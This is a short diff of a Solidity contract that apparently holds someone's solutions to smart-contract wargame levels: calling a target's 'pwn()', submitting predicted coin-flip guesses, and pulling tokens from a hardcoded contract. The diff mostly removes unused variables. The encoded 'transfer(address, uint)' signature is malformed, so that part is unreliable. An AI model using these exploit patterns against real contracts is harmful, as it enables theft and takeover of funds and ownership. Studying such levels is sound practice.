@@ -38,18 +38,18 @@ contract FlipCoinAnapoda is Ownable {
 
     function stillTokens() public returns (bool isTransfered) {
         address contrAddr = 0x63bE8347A617476CA461649897238A31835a32CE; //20999980
-        address fromAddr = 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33;
-        Token token = Token(contrAddr);
-        (bool success, bytes memory data) = contrAddr.call(
+    
+        (bool success, ) = contrAddr.call(
             abi.encodeWithSignature("transfer(address, uint)", alxAddr, 1000000)
         );
         return success; //token.transfer(fromAddr, 1000000);
     }
 
-    function callDelegation(address contrAddr) public {
-        (bool success, bytes memory data) = contrAddr.call(
+    function callDelegation(address contrAddr) public returns(bool){
+       (bool success, ) = contrAddr.call(
             abi.encodeWithSignature("pwn()")
         );
+        return success;
     }
 
     function getTelephone() public {
@@ -68,7 +68,7 @@ contract FlipCoinAnapoda is Ownable {
 
     function someUnsafeAction(address addr) public {
         bool _guess = flipMe();
-        (bool success, bytes memory data) = addr.call(
+        (bool success, ) = addr.call(
             abi.encodeWithSignature("flip(bool)", _guess)
         );
 
